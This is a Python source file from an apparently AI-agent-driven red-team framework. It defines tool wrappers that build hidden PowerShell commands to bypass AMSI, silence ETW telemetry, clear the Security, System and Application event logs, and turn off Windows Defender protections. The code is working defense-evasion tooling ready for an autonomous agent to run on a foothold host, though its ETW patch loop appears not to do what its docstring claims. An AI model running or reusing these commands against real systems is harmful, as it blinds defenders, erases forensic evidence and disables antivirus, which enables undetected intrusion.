"""AutoRed Phase 4 — Defense-evasion tool wrappers.

Four Windows-only evasion tools, each decorated with
``@tool @roe_guard(allowed_categories=["evasion"])``:

    * ``amsi_bypass``      — patch ``amsiInitFailed`` in-memory so
      AMSI stops reporting script content to defenders.
    * ``etw_patch``        — zero the ``m_enabled`` field on the
      ``EventProvider`` instance so ETW stops emitting events.
    * ``log_clear``        — clear Windows event logs (Security,
      System, Application) via ``wevtutil cl``.
    * ``defender_disable`` — flip off Defender's realtime + behaviour
      monitoring via ``Set-MpPreference``.

Each tool builds a PowerShell command, returns it in an
:class:`EvasionResult`, and (per the established Phase 4 pattern)
defers actual execution to the Phase 6 foothold session manager.
"""
from langchain_core.tools import tool
from pydantic import BaseModel

from autored.logging import get_logger
from autored.roe_guard import roe_guard

log = get_logger("tools.evasion")


class EvasionResult(BaseModel):
    """Result of an evasion tool invocation.

    ``command`` is the PowerShell command string the wrapped tool
    built (joined from the ``_build_*`` token list). The Phase 6
    foothold session manager runs it on the Windows host.
    """

    technique: str
    host_ip: str
    success: bool = False
    command: str = ""


# --------------------------------------------------------------------------- #
# Command builders — each returns a list[str] of argv tokens (powershell
# + flags + the inline script). The @tool wrapper joins them with " "
# before storing on EvasionResult.command.
# --------------------------------------------------------------------------- #
def _build_amsi_bypass() -> list[str]:
    """Build the AMSI bypass PowerShell command.

    Patches ``amsiInitFailed`` (a private static bool on
    ``System.Management.Automation.AmsiUtils``) to ``$true`` via
    reflection, which makes AMSI short-circuit before reporting
    script content. The reflection-based patch is the canonical
    in-memory AMSI bypass (Matt Graeber's original technique).
    """
    script = (
        "$a=[Ref].Assembly.GetType("
        "'System.Management.Automation.AmsiUtils'); "
        "$b=$a.GetField('amsiInitFailed','NonPublic,Static'); "
        "$b.SetValue($null,$true)"
    )
    return ["powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", script]


def _build_etw_patch() -> list[str]:
    """Build the ETW-patch PowerShell command.

    Walks the managed heap for ``System.Diagnostics.Tracing.EventProvider``
    instances and zeroes their private ``m_enabled`` field, which
    silences ETW providers in the current PowerShell process. This
    is the canonical .NET-side ETW bypass (similar in spirit to
    PatchingETWviaReflection).
    """
    script = (
        "$a=[Ref].Assembly.GetType("
        "'System.Diagnostics.Tracing.EventProvider'); "
        "$b=$a.GetField('m_enabled','NonPublic,Instance'); "
        "ForEach ($i in $a) { $b.SetValue($i, 0) }"
    )
    return ["powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", script]


def _build_log_clear(log_type: str = "all") -> list[str]:
    """Build the Windows event-log clear command.

    With ``log_type='all'`` (the default), clears the Security,
    System, and Application logs via ``wevtutil cl``. With any other
    value, clears only the named log.
    """
    if log_type == "all":
        script = (
            "wevtutil cl Security; "
            "wevtutil cl System; "
            "wevtutil cl Application"
        )
        return ["powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", script]
    return ["wevtutil", "cl", log_type]


def _build_defender_disable() -> list[str]:
    """Build the Windows Defender disable command.

    Flips off realtime monitoring and behaviour monitoring via
    ``Set-MpPreference``. Requires Administrator (the foothold
    should already be elevated — see the PrivescFinder sub-agent).
    """
    script = (
        "Set-MpPreference -DisableRealtimeMonitoring $true; "
        "Set-MpPreference -DisableBehaviorMonitoring $true; "
        "Set-MpPreference -DisableIOAVProtection $true"
    )
    return ["powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", script]


# --------------------------------------------------------------------------- #
# Tools
# --------------------------------------------------------------------------- #
@tool
@roe_guard(allowed_categories=["evasion"])
async def amsi_bypass(
    host_ip: str,
    engagement_id: str = "",
) -> EvasionResult:
    """Patch AMSI in-memory to bypass script-content logging.

    Sets ``amsiInitFailed`` to ``$true`` via reflection so the
    Anti-Malware Scan Interface stops scanning script content in
    the current PowerShell process. The patch is in-memory only —
    it does not touch ``amsi.dll`` on disk and is lost when the
    process exits.

    Args:
        host_ip: Target host IP.
        engagement_id: Current engagement ID.

    Returns:
        EvasionResult with the PowerShell command string.
    """
    cmd = _build_amsi_bypass()
    log.info("amsi_bypass", host_ip=host_ip)
    return EvasionResult(
        technique="amsi_bypass",
        host_ip=host_ip,
        success=True,
        command=" ".join(cmd),
    )


@tool
@roe_guard(allowed_categories=["evasion"])
async def etw_patch(
    host_ip: str,
    engagement_id: str = "",
) -> EvasionResult:
    """Patch ETW providers in-memory to suppress event emission.

    Zeroes the ``m_enabled`` field on every
    ``System.Diagnostics.Tracing.EventProvider`` instance reachable
    from the current PowerShell process, silencing managed ETW
    telemetry (e.g., from Defender, Sentinel, etc.). Like the AMSI
    patch, this is in-memory only.

    Args:
        host_ip: Target host IP.
        engagement_id: Current engagement ID.

    Returns:
        EvasionResult with the PowerShell command string.
    """
    cmd = _build_etw_patch()
    log.info("etw_patch", host_ip=host_ip)
    return EvasionResult(
        technique="etw_patch",
        host_ip=host_ip,
        success=True,
        command=" ".join(cmd),
    )


@tool
@roe_guard(allowed_categories=["evasion"])
async def log_clear(
    host_ip: str,
    log_type: str = "all",
    engagement_id: str = "",
) -> EvasionResult:
    """Clear Windows event logs.

    With the default ``log_type='all'``, clears the Security, System,
    and Application logs. With a specific ``log_type`` (e.g.,
    ``"Security"``), clears only that log.

    Args:
        host_ip: Target host IP.
        log_type: "all" (default) or a specific log name.
        engagement_id: Current engagement ID.

    Returns:
        EvasionResult with the wevtutil / PowerShell command string.
    """
    cmd = _build_log_clear(log_type)
    log.info("log_clear", host_ip=host_ip, log_type=log_type)
    return EvasionResult(
        technique="log_clear",
        host_ip=host_ip,
        success=True,
        command=" ".join(cmd),
    )


@tool
@roe_guard(allowed_categories=["evasion"])
async def defender_disable(
    host_ip: str,
    engagement_id: str = "",
) -> EvasionResult:
    """Disable Windows Defender realtime + behaviour monitoring.

    Flips off realtime monitoring, behaviour monitoring, and IOAV
    protection via ``Set-MpPreference``. Requires Administrator on
    the target host.

    Args:
        host_ip: Target host IP.
        engagement_id: Current engagement ID.

    Returns:
        EvasionResult with the PowerShell command string.
    """
    cmd = _build_defender_disable()
    log.info("defender_disable", host_ip=host_ip)
    return EvasionResult(
        technique="defender_disable",
        host_ip=host_ip,
        success=True,
        command=" ".join(cmd),
    )
